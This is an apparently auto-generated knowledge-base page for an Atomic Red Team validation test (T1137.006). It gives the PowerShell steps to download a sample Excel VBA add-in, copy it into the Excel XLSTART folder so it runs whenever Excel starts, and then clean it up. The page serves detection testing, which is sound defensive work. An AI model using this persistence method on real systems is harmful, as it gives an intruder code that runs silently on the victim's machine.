---
atomic_guid: "082141ed-b048-4c86-99c7-2b8da5b5bf48"
title: "Persistent Code Execution Via Excel VBA Add-in File (XLAM)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1137.006"
attack_technique_name: "Office Application Startup: Add-ins"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml"
build_date: "2026-04-26 17:02:12"
executor: "powershell"
aliases:
  - "082141ed-b048-4c86-99c7-2b8da5b5bf48"
  - "Persistent Code Execution Via Excel VBA Add-in File (XLAM)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Persistent Code Execution Via Excel VBA Add-in File (XLAM)

Creates an Excel VBA Add-in file (XLAM) which runs automatically when Excel is started
The sample XLAM provided launches the notepad as a proof-of-concept for persistent execution from Office.

## Metadata

- Atomic GUID: 082141ed-b048-4c86-99c7-2b8da5b5bf48
- Technique: T1137.006: Office Application Startup: Add-ins
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1137.006/T1137.006.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1137-office_application_startup|T1137.006]]

## Dependencies

Microsoft Excel must be installed

### Prerequisite Check

```untitled
try {
  New-Object -COMObject "Excel.Application" | Out-Null
  Stop-Process -Name "Excel"
  exit 0
} catch { exit 1 }
```

### Get Prerequisite

```untitled
Write-Host "You will need to install Microsoft Excel manually to meet this requirement"
```

XLAM file must exist on disk at specified location

### Prerequisite Check

```untitled
if (Test-Path "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam") {exit 0} else {exit 1}
```

### Get Prerequisite

```untitled
New-Item -Type Directory "PathToAtomicsFolder\T1137.006\bin\Addins\" -Force | Out-Null
Invoke-Webrequest -Uri "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/ExcelVBAaddin.xlam" -UseBasicParsing -OutFile "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam"
```

## Executor

- name: powershell

### Command

```powershell
Copy "PathToAtomicsFolder\T1137.006\bin\Addins\ExcelVBAaddin.xlam" "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam"        
Start-Process "Excel"
```

### Cleanup

```powershell
Stop-Process -Name "notepad","Excel" -ErrorAction Ignore
Start-Sleep 3
Remove-Item "$env:APPDATA\Microsoft\Excel\XLSTART\notepad.xlam" -ErrorAction Ignore
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1137.006/T1137.006.yaml)
